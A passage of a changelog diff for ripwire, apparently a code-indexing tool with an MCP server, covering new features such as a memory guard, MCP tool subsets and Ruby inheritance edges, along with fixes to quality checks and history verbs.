@@ -15,6 +15,7 @@ not published here — see `docs/EVALS.md` for the instruments behind the headli
 
 ## [Unreleased]
 
+
 ### Added — a memory guard on every root: zero-config, silent on normal runs, a disclosed partial answer past its line (#350, layer 3)
 
 ripwire measured none of its own memory, so a large tree (#350: a non-git home directory, 67 GB) could grow it until
@@ -55,13 +56,334 @@ restarted (a floor: on macOS the allocator may keep freed pages, so the re-read 
 trimming the allocator is deferred). The trip seam `RIPWIRE_TEST_MEMGUARD=crawl:N|pressure:N|parse:N|request:N` is additive — it only adds a
 trip and never replaces a real reading, so it can make a run stricter, never unguarded — and it and
 `RIPWIRE_MAX_MEMORY` are cleared by `test/lib/clean-env.sh`. Gate: `test/memguardcheck.sh` (B)–(D), including a
-real-footprint arm (this repo's `src/` under `--max-memory=64M`), a warm-cache arm and a two-run snapshot arm.
+real-footprint arm (a generated tree whose parsed facts sit far over `--max-memory=64M`), a warm-cache arm and a
+two-run snapshot arm.
 Known floors: the cgroup limit read is the v2 leaf `memory.max` only — a limit on an ancestor (a systemd slice's
 `MemoryMax`) and cgroup v1 fall back to physical RAM; `HOME` unset (no `USERPROFILE` either) means no home directory is
 recognised; `--legend=full` (the frozen 0.6.1 prose) does not define the `memory_*` attributes; the LSP server answers
 from a partial index without disclosure. Deferred: layer 2 (the non-git crawl budget and default heavy-directory
 pruning), calibrating the lines against llvm-project's measured peak (on an 8 GB machine the 5.2 GB limit is below
 llvm-project's 6.0 GB cold peak), and checks inside the ingest tail and the graph build (between phases only today).
+
+### Added — `--quality-delta` placeholder kind (the eleventh): stubs and TODOs a change adds
+
+A new kind, `placeholder`, lists the stubs and TODO comments a change added, per symbol: `todo!()` /
+`unimplemented!()`, Kotlin `TODO()`, `NotImplementedException`, a bare `raise NotImplementedError` as a free
+function's whole body, a throw/raise/panic/assert whose message says "not implemented", and a comment line
+opening with `TODO`/`FIXME` that names no issue. Every row is `origin="new-symbol"` and never gates; a
+change with no stub prints nothing new. `--help`, the MCP `quality_delta` description and the full legend
+now say eleven kinds.
+
+### Added — `--mcp-tools=LIST`: the MCP server can list a subset of its tools
+
+`ripwire --mcp --mcp-tools=LIST` (and `--listen`) lists and answers only the named tools. LIST is a comma list of
+tool names and/or two profiles: `core` (explore, batch, from_trace, impact, uses, fetch_body, edit_check,
+quality_delta; the tools the server's own instructions name, plus fetch_body) and `full` (all 33, the default).
+Measured on this build with a bare stdio server, `tools/list` is 46,368 bytes for `full`, 13,834 for `core` and
+4,224 for `grep,impact,uses`; `initialize` grows from 1,035 to 1,252 bytes under `core` for the sentence that
+announces the subset. With no flag, or `--mcp-tools=full`, every byte the server sends is unchanged.
+
+A call to a tool the subset leaves out is refused (`-32602`) with the restart that enables it, and with the
+`batch` sub-query that answers it when `batch` is listed and serves that verb; `batch` keeps serving its own
+sub-verbs. The instructions text keeps only the hints whose tool is listed. An unknown name (with a near miss and
+the valid names), a repeated name or an empty name exits 1 before the server starts. `ripwire wrap AGENT
+--mcp-tools=LIST` writes the flag into the printed server command for claude, cursor, windsurf, gemini and
+opencode, and prints a note to add it by hand for codex, openclaw and hermes. Gate: `test/mcptoolsubsetcheck.sh`.
+
+### Added — RSpec's `described_class` is the class its example group names, so a spec's calls pin to the class under test (#338)
+
+`described_class` is how RSpec spells the class under test. Inside `RSpec.describe Calc do … end`,
+`described_class.m( 1 )` is `Calc.m( 1 )`. Its receiver is a bare identifier that no binding names, though, so every
+such call declined. A spec reached nothing through it, and `tested=`, `--seams` and `--test-gate` read the class under
+test as unreached by the spec written for it.
+
+The call now pins the way a written `Calc.m( 1 )` does (#267's constant-receiver arm). The rule is RSpec's own
+(rspec-core 3.13, `Metadata::ExampleGroupHash#described_class`): a group's described class is its first description
+argument, unless that is `nil` or a String, in which case it is the parent group's. So the innermost enclosing example
+group with a constant first argument answers. An example group is `describe` / `context` (and `feature`,
+`example_group` and the `x`- / `f`- spellings), called bare or on `RSpec`, with a block. A shared group
+(`shared_examples`, `shared_examples_for`, `shared_context`) stops the walk with no answer, because its body runs in
+whichever group includes it.
+
+Stated floors, each pinned by `test/rubydescribedclasscheck.sh`:
+- **(a)** A chained receiver (`described_class.new.m`) is untouched: #267's one-hop bound.
+- **(b)** A group with no constant (`describe "text"` at the top, `describe :sym`) names no class.
+- **(c)** A `describe` on any other receiver (`Docs.describe Calc do`) is not an RSpec example group.
+- **(d)** `subject`, the implicit `described_class.new`, is not modelled.
+- **(e)** A redefined `described_class` declines. A **method** of that name (any `:described_class` symbol, as in
+  `let( :described_class )`, or `def described_class`) declines every site in the file. A **local** of that name (an
+  assignment, `||=`, a multiple-assignment target, or a block or method parameter) declines the sites Ruby reads as
+  that local: after the binding in its own scope and in the blocks nested inside it, never in a sibling block, and
+  never across a `def`. The name is matched as a whole word, so `my_described_class = x` redefines nothing.
+- **(f)** A qualified describe is named by its final segment: `RSpec.describe Cask::Tab` reads as `Tab`. Where another
+  `Tab` defines the method too, the call splits between them. Where only the other `Tab` defines it, the call pins
+  there, unmarked. A written `Cask::Tab.m` behaves the same way.
+
+Measured with `--no-cache`, `--report` edge totals, `main` (3fcd515f) against this change:
+
+| Corpus | Edges |
+| --- | --- |
+| Rails app A | 26,649 → 26,755 (+106) |
+| Rails app B | 20,807 → 21,149 (+342) |
+| activerecord, activesupport, actionpack 8.1.3 `lib/`; this repo's `src/` | default map byte-identical |
+
+`RawRef::recv` / `recvVar` change value for these call sites (the PR carried this as parser version 121, then 125);
+the record layout is unchanged.
+
+### Added — Ruby has inheritance edges: `class Child < Parent` reaches the lego view and the resolver's base walk
+
+No Ruby corpus has ever carried an inheritance edge. `captureBases` turns a class's base clause into
+inherit refs, which `buildGraph` reads into the CHA-lite name graph the resolver walks after a type's
+OWN method set misses — and Ruby reached none of it. The clause kind was never the problem
+(`superclass` is already in the table; Java's `extends` clause carries the same node name): the
+base-TYPE table held no node kind Ruby uses. Ruby names a base with `(constant)` — `class Child <
+Parent` — or `(scope_resolution)` — `class Derived < Space::Base`. Both are now read, under a
+language test rather than appended to the shared table, because both kind names are generic enough
+to mean something else in another grammar.
+
+This is floor (a) of the constant-receiver round above, lifted — and it is what held that round's
+gem numbers down, since a gem reaches its class methods up an `ActiveRecord::Base` hierarchy. Two
+things follow at once: `--lego` answers for Ruby, and `Child.build` resolves to `Parent::build`.
+
+A base is found by its final segment, like every language's, and then SCOPED by Ruby's own constant
+lookup: the superclass as written is resolved innermost-first along the enclosing `Module.nesting`,
+then at the top level (`::X` absolute), against every class and module the tree opens — the #57
+constant index, namespace wrappers included — and only the classes that ARE that constant are its
+base. So `class Rec < ActiveRecord::Base` is not an implementor of an in-tree `Space::Base`, `class
+Inner < Base` inside `module Beta` lands on `Beta::Base` alone, and a base the tree never opens adds
+nothing to the CHA name graph, so its class's walk cannot reach an unrelated in-tree `Base`. That
+join needs no new extraction: every `class X < Y` already carries its written superclass as the
+symbolic directive #57 records. The bases are read by constant rather than through `byName`, whose
+C-family decl/def collapse takes a body-less `class Base < StandardError; end` for a forward
+declaration and drops it next to any same-named class with a body.
+
+| corpus | `--lego` implementors | edges | ambiguous |
+| --- | --- | --- | --- |
+| activerecord 8.1.3 `lib`, `--lego=active_record/base.rb:Base` | 0 → 0 | 9,152 → 9,001 | 1,479 → 1,288 |
+| activerecord 8.1.3 `lib`, `--lego=active_record/encryption/errors.rb:Base` | 0 → 6 | — | — |
+| activesupport 8.1.3 `lib` | — | 3,912 → 3,915 | 434 → 422 |
+| actionpack 8.1.3 `lib` | — | 3,140 → 3,127 | 364 → 355 |
+| Rails app A, `--lego=ApplicationRecord` | 0 → 129 | 24,376 → 24,392 | 1,263 → 1,268 |
+| Rails app A, `--lego=app/controllers/application_controller.rb:ApplicationController` | 0 → 114 | — | — |
+| Rails app A, `--lego=app/controllers/admin/application_controller.rb:ApplicationController` | 0 → 19 | — | — |
+| Rails app B | — | 16,112 → 16,121 | 440 → 445 |
+
+`ambiguous` falls on the gems because a two-way split collapses into one pinned edge, which is also
+why `edges` falls where it does — 151 fewer on activerecord is 151 calls that stopped naming two
+candidates. No `ActiveRecord::Base` subclass lives in activerecord's own `lib`, so 0 is its answer;
+before the scoping, the final-segment key gave it 11, every one a collision (`ActiveJob::Base`, the
+encryption errors' own `Errors::Base`, the generators' `Base`). On the apps the scoping is what
+moves `ambiguous` UP: a call that reached an in-tree `Base` only through an out-of-tree one is no
+longer pinned there. App A's `self.data` in a model (`< ApplicationRecord < ActiveRecord::Base`) was
+pinned to a report handler's `data` through `Reports::ResolutionHandlers::Base`; it is an honest
+split now. App B's twelve `SomeModel.polymorphic_name` sites were each split three ways over the
+app's own `User::Base`, `Organization::Base` and `BankAccount::Base`; ActiveRecord answers them, and
+they mint nothing.
+
+Stated floors, each pinned by an arm of `test/rubyinheritcheck.sh`: a COMPUTED superclass (`class
+Dynamic < Struct.new( :a )`) is a call, not a name, and mints nothing — not even an edge to the
+call's receiver, which `captureBases`' one-level wrapper descent used to hand over; a MIXIN
+(`include Helper`) is NOT an inheritance edge in this round — it is a receiver-less call in the class
+BODY, the same shape and the same decision as PHP's in-body `use SomeTrait;`, and Ruby's ancestor
+chain really does hold included modules, so it is a stated residue rather than a claim that it is not
+inheritance; the base walk's METHOD probe is keyed by the immediate scope (`Base::m`), so two in-tree
+bases that share a final name still share one probe — `UsesAlpha.beta_make` pins `Beta::Base`'s
+method although `UsesAlpha < Alpha::Base`; and `Built = Class.new( Parent )`, with or without a block,
+makes `Built < Parent` at runtime but is a constant assignment whose value is a call, not a `class`
+open, so it mints no class and no edge — the same decision as a computed superclass. A class
+reopened with its superclass repeated (`class Reop < Parent … end` twice) is two symbols and one
+constant, and the lego view lists it once — app A's 129 was 130 before, one model counted twice
+because a stub reopens it with the superclass repeated. A fifth floor, of `queries/ruby/tags.scm` rather than of
+this round, is pinned beside them: a receiver-less call written with no parentheses and no arguments
+parses as `(identifier)`, not `(call)`, and is not a call site at all.
+
+The scoping is defensive in one place: an inherit reference with no superclass directive at its class
+open keeps the final-segment name rule. That fallback is now counted, and the graph gauge carries
+`ruby_bases_unscoped=N` when it was taken (absent at zero, defined in the full and compact legends).
+No well-formed input is known to reach it; `test/rubyinheritcheck.sh` drives it through a test seam.
+
+`--deps` is byte-identical on activerecord, and the default map is byte-identical on four Ruby-free
+corpora, with this repository's `--report` totals unchanged. `kParserVer` 129 in this release (carried as 97 → 99 on the PR, in two steps: 98 added the
+inheritance records; 99 dropped a computed superclass's stray receiver ref); the record layout is unchanged, and
+the `quality.h` mirror and `test/qschemetrip.hash` move with it.
+
+### Changed — `ripwire-quality-bar` gains a bounded debt fix loop
+
+A new section drives paying down EXISTING debt: pick the top `--quality-panel=strict` row, write the test first when
+nothing reaches the code, apply the table/playbook recipe for its shape, and prove it with the closed fix loop plus an
+anti-gaming rule (measure before committing, one fix per commit; `regressions="0"` and `acked=` not rising — a fix
+may not worsen any other kind); at most 3 fixes per session (a default, not a measured optimum).
+
+### Changed — `--quality-delta` error-masking also counts log-only and rethrow-only handlers
+
+`error-masking` counted only an empty handler (empty braces, `pass`, `...`, a comment-only body). It now also
+counts two shapes read off the same parse: **log-only**, a broad handler (one that catches everything or the
+root error type) whose body only logs or prints and never names the caught error, and **rethrow-only**, the
+only handler of its try re-throwing the error unchanged. Both are conservative: a log that names the error
+(`logger.exception`, `exc_info=`, the variable itself), a narrow handler, a wrapped re-throw, a re-throw
+ahead of a broader sibling handler and a C# `when` filter are not counted. The two shapes gate only in
+Python, where a hand-labelled sample measured precision 0.976 (40 of 41) and 1.000 (33 of 33); in every
+other language the row is printed as `sev="minor"` and never fires exit 2 (`kHandlerShapeGates`,
+`src/lintrules.h`; method and table in `docs/EVALS.md`). `kQSnapCacheScheme` 15 → 16.
+
+### Changed — `--metrics` prints one row per definition
+
+`--metrics` prints one row per definition. Same-name definitions in one file and scope (Java, C++ or C#
+overloads; a macro defined in several preprocessor branches) used to share ONE row that carried one
+body's `cx`/`ccx`/`loc`, so the other bodies' metrics were hidden and a join by function missed them.
+Each body now has its own row with `l=` (its start line; `"l"` in `--json`). The same split applies to a
+Python, JavaScript or Dart property's getter/setter pair and to a function defined in several `#ifdef`
+branches: each body is its own row. Bodyless declarations add
+no row: they fold into `overloads=` of the group's first body, so `rows + sum(overloads-1) = shown`
+still holds. A prototype plus its definition stays one row, now carrying the definition's metrics
+instead of the prototype's. Rows of code without same-name definitions are byte-identical, and the
+default map (no `--metrics`) keeps its collapse unchanged. The `docs/COMMANDS.md` `--metrics` example shows
+the split rows. Gate: `test/metricscheck.sh` (per-def arms).
+
+### Changed — `--impact` lists the blast radius nearest first, with its hop depth
+
+`--impact=SYM` (and the MCP `impact` twin) used to list the reach set in PageRank order with no depth, so a
+direct caller and a four-hop dependent looked alike, and the page window (40 rows by default) cut across every
+depth at once: a well-ranked distant dependent could push a direct caller off the page. Rows now run by hop
+depth first (1 = calls SYM directly), in the previous PageRank order within a depth, and the order is applied
+before the window cuts, so a cut drops the deepest rows first. Each XML row states its depth as `d=`, printed on
+the first row shown and wherever the depth changes (a row without it has the depth of the row above); the root
+carries `by_depth="1:n,2:n,…"`, which counts `reaches=` per depth, so a capped answer says which depth it stopped
+in. `--json` carries `"by_depth":[…]` and `"d"` on every row; `--format=columnar` a `<depth>` column. The set of
+symbols and every existing count are unchanged; with more than one depth in the reach set, which rows fill a cut
+page changes. Measured on this repository's own answers (four symbols, blast radius 4 to 204 symbols):
+`by_depth=` adds 27–45 B and `d=` 6–24 B, and the compact legend 127 B; `d=` on every row would have cost 240 B
+per page instead. Gate: `test/impactdepthcheck.sh`.
+
+### Changed — the versions this release moves, stated once
+
+`kParserVer` 124 → 129 (the function-literal fix takes 128; #338 and #325 take one more), `kCacheVersion` 25 → 27
+(the function-literal fix's record changes) and `kQSnapCacheScheme` 15 → 16 (the `--quality-delta` error-masking and
+placeholder changes). Every ingest cache written by an earlier build is refused and re-indexed once, and every
+cached quality snapshot is recomputed. The session legend dictionary is `dictv=0e543e1e6a3fe37d entries=750`.
+
+### Fixed — review round on train 22: false gates, a stack overflow, silent cuts
+
+- `--quality-delta` log-only handlers: a receiver is a logger only when the first or last word of its last segment is `log`, `logger` or `logging` (words split on `_`, `-` and camelCase), or a known logger package, not whenever it contains "log". A Python `except Exception: store.catalog.write(x)` no longer gates as log-only.
+- `--quality-delta` error-masking: the built-in query rules are no longer capped at 5000 matches per rule. The cap cut a path-sorted list, so on a tree with more than 5000 catch clauses the baseline and the working tree were cut at different files, and untouched code past the cut could read as a pre-existing regression (exit 2).
+- `--quality-delta`: a log call whose argument nests thousands of levels deep no longer overflows the stack (exit 138). The search for the caught error's name stops at 512 levels and then treats the handler as not log-only.
+- `--doc-drift`: a thousands-grouped number longer than 10 digits (`1,099,511,627,776`) is no longer read as its 10-digit prefix and reported as a `const-value` drift. It makes no claim.
+- `--mentions` and the MCP `mentions` tool: indexed markdown files that cannot be read back when the answer is built are counted as `unbackticked_unread=N` (MCP `"unbackticked_unread"`), instead of being treated as files with no unbackticked mention.
+- `--pattern`: the `unmatched_qualified=` reading says the count is a floor when the hit budget stops the walk (`hits_capped=1`).
+- `--hotspots`, `--cochange` and `--owners` in a multi-root workspace carry `shallow="1"` when any mined root is a shallow clone, not only when the first root is. `--owners=SYM` checks the root that holds the symbol's file.
+
+### Fixed — a name bound to a function literal has a body: no more false `bodyless_defs`, and quality verbs measure it
+
+`const f = (x) => {…}`, `export const f = function(…) {…}`, a class-field arrow, an object-literal arrow, a CommonJS
+`module.exports.f = function`, Lua's `M.f = function(x) … end` / `local f = function` / `{ f = function … }`, and a
+Python class-body `f = lambda self, x: g(x)` were captured as definitions whose def node (the declaration, the
+assignment, the table) owns no `body:` field, so each read as a bodyless declaration: `--callees=f` and MCP
+`find_symbol` answered `bodyless_defs="1"` — false — and every verb that measures only bodied functions skipped them.
+A name bound to a function literal now owns that literal's body (one data table, `kFnLiteralBinding` in
+`src/ingest_relations.h`: the languages, the literal node kinds, the value-carrying fields, the positional value
+list and the cast/paren wrappers — JS, TS/TSX, Lua and Python today). Params, cx and nest read from the literal, so a
+typed const's annotation no longer lends the arrow its parameter count, a bare `x => …` counts its one parameter, and
+a declaration binding several names
+(`const a = () => …, b = () => …`, a Lua table of function fields) gives each name its own span, so its calls
+attribute to it. On a 583-file TypeScript agent repo: `--biggest-first`, `--ensemble` and `--quality-panel` measure
+2,083 functions (was 63), `--clones` sees 32,714 lines of function body (was 819); summed
+`bodyless_defs` over every function/method name 2,043 → 23 (the 23 are interface signatures and data keys). A real
+declaration (`declare function`, an overload signature, an interface member) stays bodyless.
+
+A bodied closure also competes for calls, so the resolver now knows where one can be named: a function bound inside
+another function's body (named or anonymous — a factory's `const start = () => …`, a `const run` in an `it()` callback,
+a nested `def`, in every language) records that function's span, and a call outside it cannot reach the closure by
+name. A nested function the language binds GLOBALLY is not such a closure and competes as before: PHP's nested
+`function`, a nested Bash function, Lua's non-`local` nested `function`/assignment, and a JS assignment-bound def
+(`exports.f = function`). A call the builtin-method gate or the external-name veto already answers (`d.get()`,
+`re.sub()`) resolves exactly as before. There the closure YIELDS to every candidate the call can name instead of competing: `tui.start()` on an imported
+class binds to the class's method even when another imported module holds a factory-local `start` (on main this
+declined for a nested `function start(){}`), and a helper's `run` parameter no longer binds to a `const run` inside
+another test's callback. It keeps its edge through a factory the caller imports when nothing reachable competes
+(`createTracker().stop()`). On the same repo: edges 3,894 → 3,851, `ambiguous` 24 → 0, tier-3 `declined` 55 → 129.
+Of the edge rows main had and this build does not, 41 were guesses — 40 `process.stdout`/`stderr.write()` calls bound
+to a same-named stub method and one `render()` of a dynamically imported library bound to an unrelated class method; both
+now decline — and 7 were splits that now bind one target: 5 over same-named closures, to the one in the caller's own
+function, and 2 over a declaration and its implementation, to the implementation. 8 calls into closures that had no
+body before are new edges. Still guessed, and stated: a call whose ONLY same-named definition is such a closure can
+bind to it (a parameter call included), and a closure returned by a factory and called through the result in the SAME
+file declines when an unrelated same-named definition exists elsewhere — a TS/JS call records no member bit, so the
+resolver cannot tell `provider.get()` from a bare `get()`. A Python function that declares `global g` and then defines
+a nested `def g` binds `g` globally, but it is read as local (the `global` statement is not read), so a bare `g()`
+elsewhere can bind to a same-named method in another file where main bound the nested def. Known limit, and a new false edge in this shape: when a
+returned closure is called by name (Python `py_incr = make_counter(); py_incr(1)`, or a JS `module.exports = { jsInit }`
+from an IIFE) and the caller ALSO imports another module that defines the same name, main split the call across both
+definitions; this build pins the other module's definition, because a lone import candidate the call can reach wins
+over a closure it cannot name. The fix is the same missing member bit. The index format changes with it: `kCacheVersion` 27, so a
+cache written by an earlier build re-parses once (27, not 26: a 26 cache from an intermediate build of this change holds
+wrong scope spans and is refused too). Gate: `test/fnliteralcheck.sh` (section 6 for the edges).
+
+`--naming-consistency` no longer proposes camelCase for a JSX component: a PascalCase function in a `.tsx`/`.jsx`
+file neither votes nor is flagged (JSX reads a lowercase tag as an intrinsic element), and the header counts it as
+`component_exempt=N`. It reads the extension, not the body: a component in a plain `.js`/`.ts` file still votes. On the
+same repo the bodied arrows bring 7 React components into the vote; all 7 are exempt (`component_exempt="7"`, 0
+flagged). Gate: `test/namingconsistencycheck.sh` arm 12.
+
+### Fixed — `--flags` reads JavaScript and TypeScript `process.env` switches
+
+A TypeScript repository whose switches are all `process.env.X === "1"` checks answered `gates="0" env="0"`. The env
+lane now reads `process.env.NAME`, `process.env["NAME"]` and `process.env['NAME']` in code as `kind="env"` gates
+(default unset), the same way it reads `getenv("NAME")` and Python's `os.environ`; a read inside a comment or a
+string, and `process.env` without a name (`const env = process.env`), are not gates. In JavaScript and TypeScript
+files a backtick template literal is a string: its text — on one line, across lines, or nested inside a `${…}` — is
+not code, while the code inside `${…}` is (so `${process.env.X}` is a gate). Other languages' quote handling is
+unchanged. As for Python env gates, `regions=` and `loc=` stay 0, and both legends now say so: they are measured
+only for `#if` regions. On the aislop TypeScript repository the verb now reports 20 env gates (a 21st read sits in
+the text of a generated-source template). Gate: `flagscheck` arms 12 and 12t.
+
+### Fixed — `--doc-drift`: three false drifts on a Python repository
+
+- A doc's `NAME = 15,000` was read as 15 and reported against the code's `15_000`. In prose, a 1–3 digit lead
+  followed by `,ddd` groups is now read whole (code keeps reading `15, 000` as two values). This also clears two
+  rows on this repository (`kForPayloadBudgetBytes` = 7,500 and `kGrepCollectionBudget`=4,000,000).
+- A Python built-in exception (`NameError`) or a JavaScript/TypeScript global (`TypeError`, `structuredClone`)
+  named in a doc was "undefined". It is now counted as `<unchecked r="language-builtin">` when the corpus indexes
+  that language.
+- A section inherits the ISO date of the heading it sits under (levels 2 and deeper), so a Keep a Changelog rename
+  under `### Fixed` below `## [1.8.2] - 2026-03-17` is a dated record (`rec="block"`), not live drift. On this
+  repository 23 rows move from `drift=` to `dated=`.
+
+Gate: `docdriftcheck` arm FD.
+
+### Fixed — `--from-trace` no longer pairs one file's line with another file's definition in `next=`
+
+When the innermost frame's function name bound to a definition in a different file than the frame's own path
+(`resolved_by="name"`), `next=` spliced the frame's line onto the definition's file: a frame at
+`src/verbs_doctor.h:304` naming `escapeXml` produced `next="--slice=@src/serialize.h:304"`, a line inside another
+function. That case now hands over the definition's handle, `next="--expand=src/serialize.h:escapeXml"`, and marks
+the root `line_mismatch="1"` (present only then; defined in both legends). A frame in the definition's own file
+keeps `--slice=@FILE:LINE` byte-identically, the MCP `from_trace` twin included. Gate: `nextverbcheck` arm (5).
+
+### Fixed — `--connect` searches a many-definition terminal from the definition that joins
+
+`--connect` resolved each terminal to one definition, the lowest id, before searching. On this repository
+`--connect=main,escapeXml,Graph` took `main` from a Python bench script (one of 107 definitions) and printed every
+terminal `<unconnected>`, while `--path` joined `main` to `escapeXml` in two hops. Each definition of a terminal's
+name is now scored by how many other terminals it reaches within `radius=` on the same undirected view, then by
+the fewest hops, and the best one is searched from (CLI and MCP `connect` alike, `graph.h` `joinTerminalPicks`).
+A name none of whose definitions joins keeps the old pick, so `<unconnected>` there holds for every definition.
+When several definitions join equally well, the root names that terminal in `ambiguous_terminal=` (present only
+then). The full legend's `defs=` sentence, which said the lowest-id definition was used, now states the rule; the
+header change moves `est_tokens=` on `--connect` answers by a few tokens. Gate: `connectcheck` arm 10.
+
+### Fixed — `--dead-code` no longer reports a pytest test method as an internal-linkage orphan
+
+A Python def's signature span runs on through the comment lines that open its body, so a test method whose first
+comment contained the word `static` ("the static type is unchanged") met `--dead-code`'s internal-linkage rule and
+was reported. Two changes, shared by `--dead-code` and `--safe-delete`'s `dead_code_candidate=`: a `static` inside a
+comment (`#`, `//`, an unclosed `/*`) is no longer linkage evidence; a Python def that a test runner reaches is not a
+candidate — a pytest `test*` function or method or xunit hook in a `test_*.py` / `*_test.py` file, and a `test*` or
+setUp-family method of a class whose own bases name a `TestCase`; and a decorated Python def is not a candidate either
+(a decorator may register it; plain wrappers such as `@staticmethod`, `@property` and `@lru_cache` are included, and
+their only "linkage" evidence was a `static` token, which Python never means as linkage). `--dead-code` counts the two
+reasons apart, `runner-root-excluded=N` and `decorated-excluded=N` (floors, each absent at 0, defined in both legends).
+Not covered: a `TestCase` subclass reached only through an intermediate base, and pytest name overrides from a
+config file. Gate: `deadprecisioncheck` arms R1–R4.
 
 ### Fixed — a root nobody chose is not crawled when it is a home or system directory (#350, layer 1)
 
@@ -85,6 +407,163 @@ relative `HOME` is ignored. Canonical paths are compared, and `%WINDIR%`, `/Syst
 `/System/Volumes/Data/…`), `/proc`, `/sys` and `/dev` are refused as whole subtrees. A root typed on the CLI
 (`ripwire ~`) is always answered, under the memory guard, and subdirectories are ordinary directories. Gate:
 `test/memguardcheck.sh` (A).
+
+### Fixed — the history verbs say so when a clone is shallow
+
+On a `git clone --depth 1` (the `actions/checkout` default) the history verbs answered from one commit and said
+things that are false about the repository; the `+shallow` suffix on `at=` was the only hint. One probe
+(`git rev-parse --is-shallow-repository`, now shared by `at=`, `--doctor` and the verbs below) drives:
+
+- `--quality-delta=REV` and `--dmm=REV` on a shallow clone's boundary commit say "shallow clone: that commit's
+  parent was not fetched" and name `git fetch --deepen=N` / `git fetch --unshallow`, instead of "a root commit".
+  The raw commit object still records its parent, which is how a boundary is told from a true root commit, and a
+  true root commit is still called one.
+- `--owners`, `--hotspots` and `--cochange` (all three forms), plus the MCP `owners` and `cochange` twins, carry
+  `shallow="1"` on the root (`"shallow":true` in the cochange JSON), with a legend clause and a compact reading.
+  This is the attribute `--doctor`'s git row already uses. The numbers are unchanged; they are marked as coming
+  from only the fetched commits.
+- `--hotspots`, `--cochange` and `--owners` refusals on an empty mined history say "shallow clone: the fetched
+  history holds no commit this verb can mine", not "git unavailable / no history (need a git repo)".
+- `--rank-by=churn-decay` names its unscoped span `fetched-history` on a shallow clone, not `all-history`, and
+  both churn rankers append `(shallow clone)` to `window=`.
+- `--pr-context` and `--merge-scout` unknown-ref refusals add a shallow-clone hint.
+
+On a full-history clone every one of these answers is byte-identical to before (measured on a three-commit fixture
+for all ten verb forms under both legends, and on this repository for `--hotspots` and `--rank-by=churn-decay`).
+The legend dictionary gains one row (`dictv` changes).
+Gate: `test/shallowhistorycheck.sh` (21 checks fail on the previous binary; all 38 pass here).
+
+### Fixed — three MCP answers no longer claim more than they checked (whereis, uses, find_symbol)
+
+- **MCP `whereis`** labelled HEAD rows with the lexical shape test (`head_labels="lexical"`), and that test
+  reads a call whose line wraps after its closing `)` as a definition: `const auto ep = rw::escapeXml( …`
+  came back `kind="def"` where the CLI said `kind="ref"`. The twin now hands the tree scan the index's
+  definition sites, through the same helper the CLI calls, so HEAD rows and `head_labels=` match the CLI.
+  The lexical fallback is unchanged and still disclosed (`head_labels="lexical"`): no indexed definition of the name,
+  or a working tree that drifted from HEAD.
+- **MCP `uses`** (and the `batch` sub-query) refused a name with "no indexed definition and no use-site under that
+  spelling". The scan behind it reads indexed reference edges only, so a member access on an unindexed field
+  (a TypeScript interface property read as `row.valueToken`) is a use-site it never sees. The refusal now says
+  "no indexed reference" and points at `grep` for text uses. Indexing TypeScript interface properties is not
+  part of this fix.
+- **MCP `find_symbol`** carries two arrays, and `count`/`hop_tested`/`hop_untested` total `calls` only; a leaf read
+  `"count":0` beside `"calledBy_total":67`. A new `"count_of":"calls"` key names the array those keys total.
+  `find_referencing_symbols` has one array and is unchanged.
+
+Gate: `test/mcptwinclaimscheck.sh` (fails on the previous binary with 6 failed checks, passes on this one).
+
+### Fixed — three answers that cut silently now say what they left out
+
+- `--mentions=SYM`: `docs=` counts markdown files whose one-line backtick span is exactly the name, and nothing said
+  that prose, a code block, `callers:SYM` or a span broken across lines never counts. `--mentions=escapeXml` read
+  `docs="2"` on this repository while three more files named it. The root now carries `unbackticked_docs=N` (present
+  only when non-zero, a whole-word text match and so a ceiling) with its reading in the same answer; the MCP
+  `mentions` twin carries the same count with `"unbackticked_docs_ceiling":true`. On the tree before this change: `docs="2" unbackticked_docs="3"`. Gate: `test/mentionsverbcheck.sh` 7.
+- `--pattern`: the matcher is kind- and text-exact, so `escapeXml($X, ...)` never matched `rw::escapeXml( s, esc )`
+  and answered `hits="213"` with 46 qualified calls unmentioned (`--uses` counts 265). Those calls are still not hits
+  — the pattern did not say `rw::` — but each candidate the exact match refused is asked once more with a pattern
+  name allowed to match the last segment of a scope-qualified name (`qualified_identifier`, `scoped_identifier`,
+  `qualified_name`), and the root counts those as `unmatched_qualified=N` with a reading. Absent at zero. Gate:
+  `test/patterncheck.sh` 7.
+- `--pack-top-n` (deprecated): the budget ended the answer with a bare `<!-- truncated -->` inside the last file's
+  CDATA, the files it never reached vanished, and on this repository the loop went on serving 20–32 B fragments of
+  three more files. The first file that does not fit now closes the answer, cut at a line end with
+  `<src truncated="1" lines="1-K/T">` (a file of which no whole line fits is omitted, not served empty); when a
+  requested file was not served, `<src_cut shown= total= capped="1" budget_bytes=>` (plus `unreadable=N` for a file
+  that could not be read, which used to be skipped silently) comes first, and one comment defines both. An uncut
+  answer is byte-identical. Gate: `test/overbudgetcommentcheck.sh` B8.
+
+### Fixed — Python: a class defined in the caller's file no longer vouches for a dict's `.get`
+
+The builtin-method gate kept an edge whenever the caller's file named the target's class, and a file that merely
+DEFINES the class counted. So in the file that defines `ConnectionPool`, `data.get( "repos" )` on a json dict and
+`entry.get( "alias" )` on a dict row still bound to `ConnectionPool.get`: 4 of its 9 callers on the public Python
+repository the gate was measured on. For a Python call on a receiver other than `self`/`cls`, the class's own
+definition (its `class` statement and the declared name it leaves) is no longer evidence; a reference, binding or
+import naming the class still is. On that repository `ConnectionPool.get` now lists its 5 real callers, with the
+4 counted in `declined_calls=`. `self.get()` and `cls.get()` inside the class keep their edges, and JavaScript,
+TypeScript and Ruby keep the file-grain rule (the first records no receiver shape; a bare Ruby call is a self call).
+Because Python records no annotation as a binding, the class still counts when its name occurs in its own file beyond
+its definition (a parameter or local annotation, a string, `Optional[…]`/`List[…]`, `isinstance`, a return type — or a
+comment), read token-exact from the file; `registry.py` names `ConnectionPool` only on its `class` line. The default map
+of this repository and of all 38 Python fixture trees under `test/` is byte-identical. Gate: `test/builtinbindcheck.sh`
+arm T (a same-file decoy, plus eight same-file annotation shapes that must keep their edge).
+
+### Fixed — `--stray-content --plan` and `--merge-scout` stop extracting the subtrees the crawl prunes
+
+Each scouted arm materialised its commit with `git archive` + `tar -x` of EVERY committed byte, then ingested it
+with a crawl that prunes `third_party/`, `vendor/`, `build/` and the rest of the built-in denylist by name. On this
+repository that is 249 MB of a 325 MB archive per arm; `--stray-content --plan` (12 scouted arms) took 116 s on a
+loaded machine and a 60 s caller got no output at all. The archive now carries the denylist as exclude pathspecs
+(`:(exclude,glob)**/<dir>/**`), so an arm writes and deletes only what the crawl reads: one arm 14.4 s → 7.2 s,
